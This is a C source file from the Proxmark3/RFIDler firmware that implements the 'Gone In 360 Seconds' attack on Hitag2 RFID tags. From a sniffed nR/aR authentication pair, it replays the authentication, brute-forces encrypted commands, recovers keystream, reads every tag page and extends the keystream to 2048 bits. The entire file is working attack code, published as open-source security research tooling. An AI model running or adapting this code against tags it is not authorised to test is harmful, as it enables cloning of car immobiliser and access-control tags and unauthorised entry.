//-----------------------------------------------------------------------------
// Borrowed initially from https://github.com/factoritbv/hitag2hell
// and https://github.com/AdamLaurie/RFIDler/blob/master/firmware/Pic32/RFIDler.X/src/hitag2crack.c
// Copyright (C) Kevin Sheldrake <kev@headhacking.com>, Aug 2018
// Copyright (C) Proxmark3 contributors. See AUTHORS.md for details.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// See LICENSE.txt for the text of the license.
//-----------------------------------------------------------------------------
// hitag2 attack functions
//-----------------------------------------------------------------------------

#include "hitag2_crypto.h"
#include "hitag2crack.h"

#define READP0CMD "1100000111"
#define ERROR_RESPONSE "F402889C"

static const uint8_t Hitag2Sync[5];
static bool CryptoActive;
static Hitag_State Hitag_Crypto_State;

// hitag2_crack implements the first crack algorithm described in the paper,
// Gone In 360 Seconds by Verdult, Garcia and Balasch.
// response is a multi-line text response containing the 8 pages of the
// cracked tag;
// nrarhex is a string containing hex representations of the 32 bit nR and aR
// values (separated by a space) snooped using SNIFF-PWM.
bool hitag2_crack(uint8_t *response, uint8_t *nrarhex) {
    uint8_t uidhex[9];
    uint8_t uid[32];
    uint8_t nrar[64];
    uint8_t e_firstcmd[10];
//    uint8_t e_page0cmd[10];
    uint8_t keybits[42];
    uint8_t pagehex[9];
    uint8_t temp[20];
    int i;
    uint8_t *spaceptr = NULL;

    // get uid as hexstring
    if (!hitag2_get_uid(uidhex)) {
        UserMessage("Cannot get UID\r\n");
        return false;
    }

    // convert uid hexstring to binarray
    hextobinarray(uid, uidhex);

    // convert nR and aR hexstrings to binarray
    spaceptr = strchr(nrarhex, ' ');
    if (!spaceptr) {
        UserMessage("Please supply a valid nR aR pair\r\n");
        return false;
    }
    *spaceptr = 0x00;

    if (hextobinarray(nrar, nrarhex) != 32) {
        UserMessage("nR is not 32 bits long\r\n");
        return false;
    }

    if (hextobinarray(nrar + 32, spaceptr + 1) != 32) {
        UserMessage("aR is not 32 bits long\r\n");
        return false;
    }

    // find a valid encrypted command
    if (!hitag2crack_find_valid_e_cmd(e_firstcmd, nrar)) {
        UserMessage("Cannot find a valid encrypted command\r\n");
        return false;
    }

    // find the 'read page 0' command and recover key stream
    if (!hitag2crack_find_e_page0_cmd(keybits, e_firstcmd, nrar, uid)) {
        UserMessage("Cannot find encrypted 'read page0' command\r\n");
        return false;
    }

    // empty the response string
    response[0] = 0x00;

    // read all pages using key stream
    for (i = 0; i < 8; i++) {
        if (hitag2crack_read_page(pagehex, i, nrar, keybits)) {
            sprintf(temp, "%1d: %s\r\n", i, pagehex);
        } else {
            sprintf(temp, "%1d:\r\n", i);
        }
        // add page string to response
        strcat(response, temp);
    }

    return true;
}

// hitag2crack_find_valid_e_cmd repeatedly replays the auth protocol each
// with a different sequential encrypted command value in order to find one
// that returns a valid response.
// e_cmd is the returned binarray of the valid encrypted command;
// nrar is the binarray of the 64 bit nR aR pair.
bool hitag2crack_find_valid_e_cmd(uint8_t e_cmd[], uint8_t nrar[]) {
    uint8_t guess[10];
    uint8_t responsestr[9];

//    UserMessage("Finding valid encrypted command:");
    // we're going to hold bits 5, 7, 8 and 9 and brute force the rest
    // e.g. x x x x x 0 x 0 0 0
    for (uint8_t a = 0; a < 2; a++) {
        for (uint8_t b = 0; b < 2; b++) {
            for (uint8_t c = 0; c < 2; c++) {
                for (uint8_t d = 0; d < 2; d++) {
                    for (uint8_t e = 0; e < 2; e++) {
                        for (uint8_t g = 0; g < 2; g++) {
                            // build binarray
                            guess[0] = a;
                            guess[1] = b;
                            guess[2] = c;
                            guess[3] = d;
                            guess[4] = e;
                            guess[5] = 0;
                            guess[6] = g;
                            guess[7] = 0;
                            guess[8] = 0;
                            guess[9] = 0;

                            // send guess
                            if (hitag2crack_send_e_cmd(responsestr, nrar, guess, 10)) {
                                // check if it was valid
                                if (strcmp(responsestr, ERROR_RESPONSE) != 0) {
                                    // return the guess as the encrypted command
                                    memcpy(e_cmd, guess, 10);
                                    return true;
                                }
                            } else {
#ifdef RFIDLER_DEBUG
                                UserMessage("hitag2crack_find_valid_e_cmd:\r\n hitag2crack_send_e_cmd failed\r\n");
#endif
                            }
                            UserMessage(".");
                        }
                    }
                }
            }
        }
    }
//    UserMessage("hitag2crack_find_valid_e_cmd:\r\n no valid encrypted command found\r\n");
    return false;
}

// hitag2crack_find_e_page0_cmd tries all bit-flipped combinations of the
// valid encrypted command and tests the results by attempting an extended
// command version of the command to see if that produces a valid response.
// keybits is the returned binarray of the recovered key stream;
// e_page0cmd is the returned binarray of the encrypted 'read page 0' command;
// e_firstcmd is the binarray of the first valid encrypted command found;
// nrar is the binarray of the 64 bit nR aR pair;
// uid is the binarray of the 32 bit UID.
bool hitag2crack_find_e_page0_cmd(uint8_t keybits[], uint8_t e_firstcmd[], uint8_t nrar[], uint8_t uid[]) {
    uint8_t a, b, c, d;
    uint8_t guess[10];
    uint8_t responsestr[9];
    uint8_t e_uid[32];

    UserMessage("Finding 'read page 0' command:");
    // we're going to brute the missing 4 bits of the valid encrypted command
    for (a = 0; a < 2; a++) {
        for (b = 0; b < 2; b++) {
            for (c = 0; c < 2; c++) {
                for (d = 0; d < 2; d++) {
                    // create our guess by bit flipping the pattern of bits
                    // representing the inverted bit and the 3 page bits
                    // in both the non-inverted and inverted parts of the
                    // encrypted command.
                    memcpy(guess, e_firstcmd, 10);
                    if (a) {
                        guess[5] = !guess[5];
                        guess[0] = !guess[0];
                    }
                    if (b) {
                        guess[7] = !guess[7];
                        guess[2] = !guess[2];
                    }
                    if (c) {
                        guess[8] = !guess[8];
                        guess[3] = !guess[3];
                    }
                    if (d) {
                        guess[9] = !guess[9];
                        guess[4] = !guess[4];
                    }

                    // try the guess
                    if (hitag2crack_send_e_cmd(responsestr, nrar, guess, 10)) {
                        // check if it was valid
                        if (strcmp(responsestr, ERROR_RESPONSE) != 0) {
                            // convert response to binarray
                            hextobinarray(e_uid, responsestr);
                            // test if the guess was 'read page 0' command
                            if (hitag2crack_test_e_p0cmd(keybits, nrar, guess, uid, e_uid)) {

                                return true;
                            }
                        } else {
#ifdef RFIDLER_DEBUG
                            UserMessage("hitag2crack_find_e_page0_cmd:\r\n hitag2crack_send_e_cmd returned ERROR_RESPONSE\r\n");
#endif
                        }
                    } else {
#ifdef RFIDLER_DEBUG
                        UserMessage("hitag2crack_find_e_page0_cmd:\r\n hitag2crack_send_e_cmd failed\r\n");
#endif
                    }
                    UserMessage(".");
                }
            }
        }
    }
    UserMessage("hitag2crack_find_e_page0_cmd:\r\n could not find encrypted 'read page 0' command\r\n");
    return false;
}

// hitag2crack_test_e_p0cmd XORs the message (command + response) with the
// encrypted version to retrieve the key stream.  It then uses this key stream
// to encrypt an extended version of the READP0CMD and tests if the response
// is valid.
// keybits is the returned binarray of the key stream;
// nrar is the 64 bit binarray of nR aR pair;
// e_cmd is the binarray of the encrypted command;
// uid is the binarray of the card UID;
// e_uid is the binarray of the encrypted version of the UID.
bool hitag2crack_test_e_p0cmd(uint8_t *keybits, uint8_t *nrar, uint8_t *e_cmd, uint8_t *uid, uint8_t *e_uid) {
    uint8_t cipherbits[42];
    uint8_t plainbits[42];
    uint8_t ext_cmd[40];
    uint8_t e_ext_cmd[40];
    uint8_t responsestr[9];
    int i;

    // copy encrypted cmd to cipherbits
    memcpy(cipherbits, e_cmd, 10);

    // copy encrypted uid to cipherbits
    memcpy(cipherbits + 10, e_uid, 32);

    // copy cmd to plainbits
    binstringtobinarray(plainbits, READP0CMD);

    // copy uid to plainbits
    memcpy(plainbits + 10, uid, 32);

    // xor the plainbits with the cipherbits to get keybits
    hitag2crack_xor(keybits, plainbits, cipherbits, 42);

    // create extended cmd -> 4 * READP0CMD = 40 bits
    for (i = 0; i < 4; i++) {
        binstringtobinarray(ext_cmd + (i * 10), READP0CMD);
    }

    // xor extended cmd with keybits
    hitag2crack_xor(e_ext_cmd, ext_cmd, keybits, 40);

    // send extended encrypted cmd
    if (hitag2crack_send_e_cmd(responsestr, nrar, e_ext_cmd, 40)) {
        // test if it was valid
        if (strcmp(responsestr, ERROR_RESPONSE) != 0) {
            return true;
        }
    } else {
#ifdef RFIDLER_DEBUG
        UserMessage("hitag2crack_test_e_p0cmd:\r\n hitag2crack_send_e_cmd failed\r\n");
#endif
    }

    return false;

}

// hitag2crack_xor XORs the source with the pad to produce the target.
// source, target and pad are binarrays of length len.
void hitag2crack_xor(uint8_t *target, const uint8_t *source, const uint8_t *pad, unsigned int len) {

    for (int i = 0; i < len; i++) {
        target[i] = source[i] ^ pad[i];
    }
}

// hitag2crack_read_page uses the supplied key stream and nrar pair to read the
// given page, returning the response as a hexstring.
// responsestr is the returned hexstring;
// pagenum is the page number to read;
// nrar is the 64 bit binarray of the nR aR pair;
// keybits is the binarray of the key stream.
bool hitag2crack_read_page(uint8_t *responsestr, uint8_t pagenum, uint8_t *nrar, uint8_t *keybits) {
    uint8_t cmd[10];
    uint8_t e_cmd[10];
    uint8_t e_responsestr[9];

    if (pagenum > 7) {
        UserMessage("hitag2crack_read_page:\r\n invalid pagenum\r\n");
        return false;
    }

    // create cmd
    binstringtobinarray(cmd, READP0CMD);
    if (pagenum & 0x1) {
        cmd[9] = !cmd[9];
        cmd[4] = !cmd[4];
    }
    if (pagenum & 0x2) {
        cmd[8] = !cmd[8];
        cmd[3] = !cmd[3];
    }
    if (pagenum & 0x4) {
        cmd[7] = !cmd[7];
        cmd[2] = !cmd[2];
    }

    // encrypt command
    hitag2crack_xor(e_cmd, cmd, keybits, 10);

    // send encrypted command
    if (hitag2crack_send_e_cmd(e_responsestr, nrar, e_cmd, 10)) {
        // check if it is valid
        if (strcmp(e_responsestr, ERROR_RESPONSE) != 0) {
            uint8_t e_response[32];
            uint8_t response[32];
            // convert to binarray
            hextobinarray(e_response, e_responsestr);
            // decrypt response
            hitag2crack_xor(response, e_response, keybits + 10, 32);
            // convert to hexstring
            binarraytohex(responsestr, response, 32);
            return true;
        } else {
            UserMessage("hitag2crack_read_page:\r\n hitag2crack_send_e_cmd returned ERROR_RESPONSE\r\n");
        }
    } else {
        UserMessage("hitag2crack_read_page:\r\n hitag2crack_send_e_cmd failed\r\n");
    }

    return false;
}

// hitag2crack_send_e_cmd replays the auth and sends the given encrypted
// command.
// responsestr is the hexstring of the response to the command;
// nrar is the 64 bit binarray of the nR aR pair;
// cmd is the binarray of the encrypted command to send;
// len is the length of the encrypted command.
bool hitag2crack_send_e_cmd(uint8_t *responsestr, uint8_t *nrar, uint8_t *cmd, int len) {
//    uint8_t tmp[37];
    uint8_t uid[9];
    uint8_t e_page3str[9];

    // get the UID
    if (!hitag2_get_uid(uid)) {
        UserMessage("hitag2crack_send_e_cmd:\r\n cannot get UID\r\n");
        return false;
    }

    // START_AUTH kills active crypto session
    CryptoActive = false;

    // get the UID again
    if (!hitag2_get_uid(uid)) {
        UserMessage("hitag2crack_send_e_cmd:\r\n cannot get UID (2nd time)\r\n");
        return false;
    }

    // send nrar and receive (useless) encrypted page 3 value
    if (!hitag2crack_tx_rx(e_page3str, nrar, 64, RWD_STATE_WAKING, false)) {
        UserMessage("hitag2crack_send_e_cmd:\r\n tx/rx nrar failed\r\n");
        return false;
    }

    // send encrypted command
    if (!hitag2crack_tx_rx(responsestr, cmd, len, RWD_STATE_WAKING, false)) {
#ifdef RFIDLER_DEBUG
        UserMessage("hitag2crack_send_e_cmd:\r\n tx/rx cmd failed\r\n");
#endif
        return false;
    }

    return true;
}

// hitag2crack_tx_rx transmits a message and receives a response.
// responsestr is the hexstring of the response;
// msg is the binarray of the message to send;
// state is the RWD state;
// reset indicates whether to reset RWD state after.
bool hitag2crack_tx_rx(uint8_t *responsestr, uint8_t *msg, int len, int state, bool reset) {
    uint8_t tmp[37];
    int ret = 0;

    // START_AUTH kills active crypto session
    CryptoActive = false;

    if (!rwd_send(msg, len, reset, BLOCK, state, RFIDlerConfig.FrameClock, 0, RFIDlerConfig.RWD_Wait_Switch_RX_TX, RFIDlerConfig.RWD_Zero_Period, RFIDlerConfig.RWD_One_Period, RFIDlerConfig.RWD_Gap_Period, RFIDlerConfig.RWD_Wait_Switch_TX_RX)) {
        UserMessage("hitag2crack_tx_rx: rwd_send failed\r\n");
        return false;
    }

    // skip 1/2 bit to synchronise manchester
    HW_Skip_Bits = 1;
    ret = read_ask_data(RFIDlerConfig.FrameClock, RFIDlerConfig.DataRate, tmp, 37, RFIDlerConfig.Sync, RFIDlerConfig.SyncBits, RFIDlerConfig.Timeout, ONESHOT_READ, BINARY);

    // check if response was a valid length (5 sync bits + 32 bits response)
    if (ret == 37) {
        // check sync bits
        if (memcmp(tmp, Hitag2Sync, 5) != 0) {
            UserMessage("hitag2crack_tx_rx: no sync\r\n");
            return false;
        }

        // convert response to hexstring
        binarraytohex(responsestr, tmp + 5, 32);
        return true;
    } else {
#ifdef RFIDLER_DEBUG
        UserMessage("hitag2crack_tx_rx: wrong rx len\r\n");
#endif
        return false;
    }
    return false;
}


bool hitag2crack_rng_init(uint8_t *response, uint8_t *input) {
    uint64_t sharedkey;
    uint32_t serialnum;
    uint32_t initvector;
    uint8_t *spaceptr;
    uint8_t *dataptr;

    // extract vals from input
    dataptr = input;
    spaceptr = strchr(dataptr, ' ');
    if (!spaceptr) {
        UserMessage("/r/nformat is 'sharedkey UID nR' in hex\r\n");
        return false;
    }

    *spaceptr = 0x00;

    if (strlen(dataptr) != 12) {
        UserMessage("/r/nsharedkey should be 48 bits long (12 hexchars)\r\n");
        return false;
    }

    sharedkey = rev64(hexreversetoulonglong(dataptr));

    dataptr = spaceptr + 1;
    spaceptr = strchr(dataptr, ' ');
    if (!spaceptr) {
        UserMessage("/r/nno UID\r\n");
        return false;
    }

    *spaceptr = 0x00;
    if (strlen(dataptr) != 8) {
        UserMessage("/r/nUID should be 32 bits long (8 hexchars)\r\n");
        return false;
    }

    serialnum = rev32(hexreversetoulong(dataptr));

    dataptr = spaceptr + 1;

    if (strlen(dataptr) != 8) {
        UserMessage("/r/nnR should be 32 bits long (8 hexchars)\r\n");
        return false;
    }

    initvector = rev32(hexreversetoulong(dataptr));

    // start up crypto engine
    hitag2_init(&Hitag_Crypto_State, sharedkey, serialnum, initvector);

    strcpy(response, "Success\r\n");

    return true;
}

bool hitag2crack_decrypt_hex(uint8_t *response, uint8_t *hex) {
    uint8_t bin[32];
    uint8_t binhex[9];
    uint8_t binstr[33];
    uint32_t binulong;

    if (strlen(hex) != 8) {
        UserMessage("/r/nhex must be 32bits (8 hex chars)\r\n");
        return false;
    }

    binulong = hextoulong(hex);

    ulongtobinarray(bin, hitag2_crypt(binulong, 32), 32);
    binarraytobinstring(binstr, bin, 32);
    binarraytohex(binhex, bin, 32);
//    UserMessage("ar = %s\r\n", binstr);
//    UserMessage("arhex = %s\r\n", binhex);

    strcpy(response, binhex);
    return true;
}

bool hitag2crack_decrypt_bin(uint8_t *response, uint8_t *e_binstr) {
    uint8_t bin[32];
    uint8_t e_bin[32];
    uint8_t binstr[33];
    uint32_t binulong;
    int len;

    len = strlen(e_binstr);
    if (len > 32) {
        UserMessage("\r\nbinary string must be <= 32 bits\r\n");
        return false;
    }

    binstringtobinarray(e_bin, e_binstr);
    binulong = binarraytoulong(e_bin, len);

    ulongtobinarray(bin, hitag2_crypt(binulong, len), len);
    binarraytobinstring(binstr, bin, len);
    strcpy(response, binstr);
    return true;
}

bool hitag2crack_encrypt_hex(uint8_t *response, uint8_t *hex) {
    // XOR pad so encrypt == decrypt :)
    return hitag2crack_decrypt_hex(response, hex);
}

bool hitag2crack_encrypt_bin(uint8_t *response, uint8_t *e_binstr) {
    return hitag2crack_decrypt_bin(response, e_binstr);
}

// hitag2_keystream uses the first crack algorithm described in the paper,
// Gone In 360 Seconds by Verdult, Garcia and Balasch, to retrieve 2048 bits
// of keystream.
// response is a multi-line text response containing the hex of the keystream;
// nrarhex is a string containing hex representations of the 32 bit nR and aR
// values (separated by a space) snooped using SNIFF-PWM.
bool hitag2_keystream(uint8_t *response, uint8_t *nrarhex) {
    uint8_t uidhex[9];
    uint8_t uid[32];
    uint8_t nrar[64];
    uint8_t e_firstcmd[10];
//    uint8_t e_page0cmd[10];
//    uint8_t keybits[2080];
    uint8_t *keybits = DataBuff;
    uint8_t keybitshex[67];
    int kslen;
    int ksoffset;
//    uint8_t pagehex[9];
//    uint8_t temp[20];
    int i;
    uint8_t *spaceptr = NULL;

    /*
        keybits = malloc(2080);
        if (!keybits) {
            UserMessage("cannot malloc keybits\r\n");
            return false;
        }
    */

    // get uid as hexstring
    if (!hitag2_get_uid(uidhex)) {
        UserMessage("Cannot get UID\r\n");
        return false;
    }

    // convert uid hexstring to binarray
    hextobinarray(uid, uidhex);

    // convert nR and aR hexstrings to binarray
    spaceptr = strchr(nrarhex, ' ');
    if (!spaceptr) {
        UserMessage("Please supply a valid nR aR pair\r\n");
        return false;
    }
    *spaceptr = 0x00;

    if (hextobinarray(nrar, nrarhex) != 32) {
        UserMessage("nR is not 32 bits long\r\n");
        return false;
    }

    if (hextobinarray(nrar + 32, spaceptr + 1) != 32) {
        UserMessage("aR is not 32 bits long\r\n");
        return false;
    }

    // find a valid encrypted command
    if (!hitag2crack_find_valid_e_cmd(e_firstcmd, nrar)) {
        UserMessage("Cannot find a valid encrypted command\r\n");
        return false;
    }

    // find the 'read page 0' command and recover key stream
    if (!hitag2crack_find_e_page0_cmd(keybits, e_firstcmd, nrar, uid)) {
        UserMessage("Cannot find encrypted 'read page0' command\r\n");
        return false;
    }

    // using the 40 bits of keystream in keybits, sending commands with ever
    // increasing lengths to acquire 2048 bits of key stream.
    kslen = 40;

    while (kslen < 2048) {
        ksoffset = 0;
        if (!hitag2crack_send_auth(nrar)) {
            UserMessage("hitag2crack_send_auth failed\r\n");
            return false;
        }
        // while we have at least 52 bits of keystream, consume it with
        // extended read page 0 commands. 52 = 10 (min command len) +
        // 32 (response) + 10 (min command len we'll send)
        while ((kslen - ksoffset) >= 52) {
            // consume the keystream, updating ksoffset as we go
            if (!hitag2crack_consume_keystream(keybits, kslen, &ksoffset, nrar)) {
                UserMessage("hitag2crack_consume_keystream failed\r\n");
                return false;
            }
        }
        // send an extended command to retrieve more keystream, updating kslen
        // as we go
        if (!hitag2crack_extend_keystream(keybits, &kslen, ksoffset, nrar, uid)) {
            UserMessage("hitag2crack_extend_keystream failed\r\n");
            return false;
        }
        UserMessage("Recovered %d bits of keystream\r\n", kslen);

    }

    for (i = 0; i < 2048; i += 256) {
        binarraytohex(keybitshex, keybits + i, 256);
        UserMessage("%s\r\n", keybitshex);
    }

    response[0] = 0x00;

    return true;
}

// hitag2crack_send_auth replays the auth and returns.
// nrar is the 64 bit binarray of the nR aR pair;
bool hitag2crack_send_auth(uint8_t *nrar) {
    uint8_t uid[9];
    uint8_t e_page3str[9];

    // get the UID
    if (!hitag2_get_uid(uid)) {
        UserMessage("hitag2crack_send_auth:\r\n cannot get UID\r\n");
        return false;
    }

    // START_AUTH kills active crypto session
    CryptoActive = false;

    // get the UID again
    if (!hitag2_get_uid(uid)) {
        UserMessage("hitag2crack_send_auth:\r\n cannot get UID (2nd time)\r\n");
        return false;
    }

    // send nrar and receive (useless) encrypted page 3 value
    if (!hitag2crack_tx_rx(e_page3str, nrar, 64, RWD_STATE_WAKING, false)) {
        UserMessage("hitag2crack_send_auth:\r\n tx/rx nrar failed\r\n");
        return false;
    }
    return true;
}

// hitag2crack_consume_keystream sends an extended command (up to 510 bits in
// length) to consume keystream.
// keybits is the binarray of keystream bits;
// kslen is the length of keystream;
// ksoffset is a pointer to the current keystream offset (updated by this fn);
// nrar is the 64 bit binarray of the nR aR pair.
bool hitag2crack_consume_keystream(uint8_t *keybits, int kslen, int *ksoffset, uint8_t *nrar) {
    int conlen;
    int numcmds;
    int i;
    uint8_t ext_cmd[510];
    uint8_t e_ext_cmd[510];
    uint8_t responsestr[9];

    // calculate the length of keybits to consume with the extended command.
    // 42 = 32 bit response + 10 bit command reserved for next command.  conlen
    // cannot be longer than 510 bits to fit into the small RWD buffer.
    conlen = kslen - *ksoffset - 42;
    if (conlen < 10) {
        UserMessage("hitag2crack_consume_keystream:\r\n conlen < 10\r\n");
        return false;
    }

    // sanitise conlen
    if (conlen > 510) {
        conlen = 510;
    }

    // calculate how many repeated commands to send in this extended command.
    numcmds = conlen / 10;

    // build extended command
    for (i = 0; i < numcmds; i++) {
        binstringtobinarray(ext_cmd + (i * 10), READP0CMD);
    }

    // xor extended cmd with keybits
    hitag2crack_xor(e_ext_cmd, ext_cmd, keybits + *ksoffset, numcmds * 10);

    // send encrypted command
    if (!hitag2crack_tx_rx(responsestr, e_ext_cmd, numcmds * 10, RWD_STATE_WAKING, false)) {
        UserMessage("hitag2crack_consume_keystream:\r\n tx/rx cmd failed\r\n");
        return false;
    }

    // test response
    if (strcmp(responsestr, ERROR_RESPONSE) == 0) {
        UserMessage("hitag2crack_consume_keystream:\r\n got error response from card\r\n");
        return false;
    }

    // don't bother decrypting the response - we already know the keybits

    // update ksoffset with command length and response
    *ksoffset += (numcmds * 10) + 32;

    return true;
}

// hitag2crack_extend_keystream sends an extended command to retrieve more keybits.
// keybits is the binarray of the keystream bits;
// kslen is a pointer to the current keybits length;
// ksoffset is the offset into the keybits array;
// nrar is the 64 bit binarray of the nR aR pair;
// uid is the 32 bit binarray of the UID.
bool hitag2crack_extend_keystream(uint8_t *keybits, int *kslen, int ksoffset, uint8_t *nrar, uint8_t *uid) {
    int cmdlen;
    int numcmds;
    uint8_t ext_cmd[510];
    uint8_t e_ext_cmd[510];
    uint8_t responsestr[9];
    uint8_t e_response[32];
    int i;

    // calc number of command iterations to send
    cmdlen = *kslen - ksoffset;
    if (cmdlen < 10) {
        UserMessage("hitag2crack_extend_keystream:\r\n cmdlen < 10\r\n");
        return false;
    }

    numcmds = cmdlen / 10;

    // build extended command
    for (i = 0; i < numcmds; i++) {
        binstringtobinarray(ext_cmd + (i * 10), READP0CMD);
    }

    // xor extended cmd with keybits
    hitag2crack_xor(e_ext_cmd, ext_cmd, keybits + ksoffset, numcmds * 10);

    // send extended encrypted cmd
    if (!hitag2crack_tx_rx(responsestr, e_ext_cmd, numcmds * 10, RWD_STATE_WAKING, false)) {
        UserMessage("hitag2crack_extend_keystream:\r\n tx/rx cmd failed\r\n");
        return false;
    }

    // test response
    if (strcmp(responsestr, ERROR_RESPONSE) == 0) {
        UserMessage("hitag2crack_extend_keystream:\r\n got error response from card\r\n");
        return false;
    }

    // convert response to binarray
    hextobinarray(e_response, responsestr);

    // recover keystream from encrypted response
    hitag2crack_xor(keybits + ksoffset + (numcmds * 10), e_response, uid, 32);

    // update kslen
    *kslen = ksoffset + (numcmds * 10) + 32;

    return true;

}

bool hitag2_reader(uint8_t *response, uint8_t *key, bool interactive) {
    uint8_t tmp[9];

    response[0] = '\0';
    // auth to tag
    if (hitag2_crypto_auth(tmp, key)) {
        // read tag, one page at a time
        for (int i = 0; i <= 7; ++i) {
            if (!read_tag(tmp, i, i)) {
                // if read fails, it could be because of auth,
                // so try to reauth
                if (!hitag2_crypto_auth(tmp, key)) {
                    // if we can't reauth, it's a real failure
                    return false;
                }
                // temp failure (probably due to page protections)
                strcpy(tmp, "XXXXXXXX");
            }
            // page contents are in tmp
            strcat(response, tmp);
        }

        if (interactive) {
            tmp[8] = '\0';
            for (i = 0; i <= 7 ; ++i) {
                UserMessageNum("%d: ", i);
                memcpy(tmp, response + (i * 8), 8);
                UserMessage("%s\r\n", tmp);
            }
            UserMessage("%s", "\r\n");
        } else {
            hitag2_nvm_store_tag(response);
        }
        return true;
    } else {
        return false;
    }
}
